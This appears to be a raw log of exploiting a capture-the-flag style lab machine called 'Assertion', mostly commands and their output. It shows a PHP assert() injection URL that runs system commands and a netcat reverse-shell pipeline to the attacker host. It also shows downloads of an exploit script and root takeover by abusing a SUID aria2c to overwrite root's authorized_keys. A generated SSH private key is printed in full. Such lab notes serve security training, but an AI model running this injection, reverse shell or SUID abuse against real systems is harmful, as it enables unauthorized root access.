@@ -1,0 +1,312 @@
+└─$ sudo nmap -sV -A 172.16.85.134 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-09 02:36 EDT
+Nmap scan report for 172.16.85.134
+Host is up (0.00039s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 6e:ce:aa:cc:02:de:a5:a3:58:5d:da:2b:ef:54:07:f9 (RSA)
+|   256 9d:3f:df:16:7a:e1:59:58:84:4a:e3:29:8f:44:87:8d (ECDSA)
+|_  256 87:b5:6f:f8:21:81:d3:3b:43:d0:40:81:c0:e3:69:89 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Assertion
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+MAC Address: 00:0C:29:3C:B8:40 (VMware)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+└─$ dirsearch -u 172.16.85.134
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                 
+ (_||| _) (/_(_|| (_| )                                                                                                                                          
+                                                                                                                                                                 
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/kali/Downloads/reports/_172.16.85.134/_24-05-09_02-47-22.txt
+
+Target: http://172.16.85.134/
+
+[02:47:22] Starting:                                                                                                                                             
+[02:47:23] 301 -  311B  - /js  ->  http://172.16.85.134/js/                 
+[02:47:23] 403 -  278B  - /.ht_wsr.txt                                      
+[02:47:23] 403 -  278B  - /.htaccess.bak1                                   
+[02:47:23] 403 -  278B  - /.htaccess.sample                                 
+[02:47:23] 403 -  278B  - /.htaccess.save
+[02:47:23] 403 -  278B  - /.htaccess_extra                                  
+[02:47:23] 403 -  278B  - /.htaccessBAK
+[02:47:23] 403 -  278B  - /.htaccessOLD
+[02:47:23] 403 -  278B  - /.htaccess.orig
+[02:47:23] 403 -  278B  - /.htaccess_orig                                   
+[02:47:23] 403 -  278B  - /.htaccess_sc
+[02:47:23] 403 -  278B  - /.htaccessOLD2
+[02:47:23] 403 -  278B  - /.htm                                             
+[02:47:23] 403 -  278B  - /.html                                            
+[02:47:23] 403 -  278B  - /.htpasswd_test                                   
+[02:47:23] 403 -  278B  - /.httr-oauth
+[02:47:23] 403 -  278B  - /.htpasswds                                       
+[02:47:24] 403 -  278B  - /.php                                             
+[02:47:26] 200 -    4KB - /about.php                                        
+[02:47:33] 200 -    2KB - /contact.php                                      
+[02:47:33] 301 -  312B  - /css  ->  http://172.16.85.134/css/               
+[02:47:36] 301 -  314B  - /fonts  ->  http://172.16.85.134/fonts/           
+[02:47:37] 200 -    2KB - /gallery.php                                      
+[02:47:38] 301 -  312B  - /img  ->  http://172.16.85.134/img/               
+[02:47:39] 200 -  609B  - /js/                                              
+[02:47:43] 301 -  314B  - /pages  ->  http://172.16.85.134/pages/           
+[02:47:43] 200 -  531B  - /pages/                                           
+[02:47:47] 403 -  278B  - /server-status                                    
+[02:47:47] 403 -  278B  - /server-status/                                   
+                                                                             
+Task Completed  
+
+#assert function
+
+http://172.16.85.134/index.php?page=%27%20and%20die(system(%22id%22))%20or%20%27
+uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+http://172.16.85.134/index.php?page=%27%20and%20die(system(%22ls%20/bin/nc*%22))%20or%20%27
+
+/bin/nc /bin/nc.openbsd /bin/nc.openbsd
+
+nc -nv 172.16.85.133 9009 | /bin/bash | nc -nv 172.16.85.133 8080 # try this
+
+www-data@assertion:/var/www/html$ uname -a
+Linux assertion 4.15.0-74-generic #84-Ubuntu SMP Thu Dec 19 08:06:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+
+www-data@assertion:/var/www/html$ cat /etc/os*
+NAME="Ubuntu"
+VERSION="18.04.3 LTS (Bionic Beaver)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 18.04.3 LTS"
+VERSION_ID="18.04"
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+VERSION_CODENAME=bionic
+UBUNTU_CODENAME=bionic
+
+└─$ searchsploit ubuntu 18.04 
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                      |  Path
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Ubuntu 18.04 - 'lxd' Privilege Escalation                                                                                           | linux/local/46978.sh
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+
+
+www-data@assertion:/var/www/html$ wget http://172.16.85.133/a.sh /tmp/c.txt
+--2024-05-09 07:27:50--  http://172.16.85.133/a.sh
+Connecting to 172.16.85.133:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1451 (1.4K) [text/x-sh]
+a.sh: Permission denied
+
+#seems do not have the right to write file on disk
+
+Cannot write to 'a.sh' (Permission denied).
+/tmp/c.txt: Scheme missing.
+
+
+
+
+www-data@assertion:/var/www/html$ find / -perm -u=s -type f 2>/dev/null
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/bin/at
+/usr/bin/aria2c
+/usr/bin/newgrp
+/usr/bin/newgidmap
+/usr/bin/newuidmap
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/traceroute6.iputils
+/usr/bin/gpasswd
+/usr/bin/chfn
+/bin/ping
+/bin/mount
+/bin/fusermount
+/bin/su
+/bin/umount
+/snap/core/16928/bin/mount
+/snap/core/16928/bin/ping
+/snap/core/16928/bin/ping6
+/snap/core/16928/bin/su
+/snap/core/16928/bin/umount
+/snap/core/16928/usr/bin/chfn
+/snap/core/16928/usr/bin/chsh
+/snap/core/16928/usr/bin/gpasswd
+/snap/core/16928/usr/bin/newgrp
+/snap/core/16928/usr/bin/passwd
+/snap/core/16928/usr/bin/sudo
+/snap/core/16928/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/16928/usr/lib/openssh/ssh-keysign
+/snap/core/16928/usr/lib/snapd/snap-confine
+/snap/core/16928/usr/sbin/pppd
+
+www-data@assertion:/var/www/html$ ls -la /usr/bin/aria2c
+-rwsr-sr-x 1 root root 2947584 Jan  5  2018 /usr/bin/aria2c
+#aria2c is a tool for downloading
+ www-data@assertion:/var/www/html$ 
+<aria2c -d /tmp -o ac.sh "http://172.16.85.133/a.sh"
+
+05/09 07:44:40 [NOTICE] Downloading 1 item(s)
+
+#try to download the exp 
+05/09 07:44:40 [NOTICE] Download complete: /tmp/ac.sh
+
+Download Results:
+gid   |stat|avg speed  |path/URI
+======+====+===========+=======================================================
+5b1169|OK  |        n/a|/tmp/ac.sh
+
+Status Legend:
+(OK):download completed.
+
+www-data@assertion:/var/www/html$ cd /tmp
+www-data@assertion:/tmp$ ls
+ac.sh  vfsZhN1
+www-data@assertion:/tmp$ ls -la
+total 16
+drwxrwxrwt  3 root     root     4096 May  9 07:44 .
+drwxr-xr-x 26 root     root     4096 Jan 16  2020 ..
+-rw-r--r--  1 root     root     1451 May  9 07:44 ac.sh
+drwx------  2 www-data www-data 4096 May  9 07:22 vfsZhN1
+www-data@assertion:/tmp$ chmod +x ac.sh
+chmod: changing permissions of 'ac.sh': Operation not permitted
+#unlucky to privi to grant the x privi
+#try to gen the pub key to the host to ssh it
+└─$ ssh-keygen -t rsa
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/kali/.ssh/id_rsa): /home/kali/genkey
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/kali/genkey
+Your public key has been saved in /home/kali/genkey.pub
+The key fingerprint is:
+SHA256:9c97zmlnOid4FFzEAA6+KZVU0OlnDAVgz9Isx5c+C1Q kali@kali
+The key's randomart image is:
++---[RSA 3072]----+
+|          *=+=E+.|
+|         + X+. .o|
+|          B.X+o. |
+|         o O.o*  |
+|        S o ooo. |
+|         .   +.o |
+|             o+  |
+|            . ++*|
+|             .+X+|
++----[SHA256]-----+
+
+─$ cat genkey 
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+/FnLMjmmTi+dcAAAAJa2FsaUBrYWxpAQI=
+-----END OPENSSH PRIVATE KEY-----
+                                                                                                                                                                      
+┌──(kali㉿kali)-[~]
+└─$ cat genkey.pub 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDnGaDOS5BY88SIOMvav2SZ7LyCkfBWDSBqPu8qiMmMlq0616xeYiblgoZjkuNvl387pSOC4M9bkEX/MSLpiOZaWGygfET/yrYBuRgtAVd6ckR5PF1Y0/5FGe8cgfULwkZ8uGu/ajf0A/pN/rn868e1S2pCo9TY6bB5KH+elC0cHMlujpZLTNFLIWsxJcGXNdujpvGHb+uzDOKe2LDkJsVwV98WZJQEmR2mcDKdhhFzKfVbHYNpS+XmP43TJx3M3WrSUBafFUWdLkll4YJ2O74hwPzoH1ohKGYZHOxy4I97XBN1ONS/b7b4naaAkrTgtNEmlDbxQHTD5BQLT4SxTuVsyM4eeuYmdEysRENmU6N5OB8nMeWFwBGjsysy0PxQ3MMO8Gdc8N5NnnPzlLZGPiRGiqWR8vCpGuVxhjjxwEfN3upohVd/eSA12VdfEBrl1dFNaga+thqiCn82i+5EpyrP8gcRdD/+dccZ9QUYNIrohJfHpNZ1/VmYoP+iHQ1vlAE= kali@kali
+
+# download it into /root/.ssh/
+$/usr/bin/aria2c -d /root/.ssh -o authorized_keys "http://172.16.85.133/genkey.pub" --allow-overwrite=true
+
+<o authorized_keys "http://172.16.85.133/genkey.pub"
+
+05/09 08:15:39 [NOTICE] Downloading 1 item(s)
+
+05/09 08:15:39 [NOTICE] File already exists. Renamed to /root/.ssh/authorized_keys
+
+05/09 08:15:39 [NOTICE] Download complete: /root/.ssh/authorized_keys
+
+Download Results:
+gid   |stat|avg speed  |path/URI
+======+====+===========+=======================================================
+4df6c7|OK  |        n/a|/root/.ssh/authorized_keys
+
+Status Legend:
+(OK):download completed.
+
+└─$ ssh root@172.16.85.134          
+The authenticity of host '172.16.85.134 (172.16.85.134)' can't be established.
+ED25519 key fingerprint is SHA256:h5lC324FZUjN4E597OGH1VIQAd8zwpigsGTeqy6ZhSU.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '172.16.85.134' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu May  9 08:34:21 UTC 2024
+
+  System load:  1.08               Processes:            202
+  Usage of /:   35.7% of 19.56GB   Users logged in:      0
+  Memory usage: 15%                IP address for ens33: 172.16.85.134
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+417 packages can be updated.
+345 updates are security updates.
+
+
+Last login: Sat Jun 27 12:38:36 2020
+root@assertion:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@assertion:~# ls
+root.txt
+root@assertion:~# cat root.txt 
+8efabdae07730bdcb14d83e37a2e7398
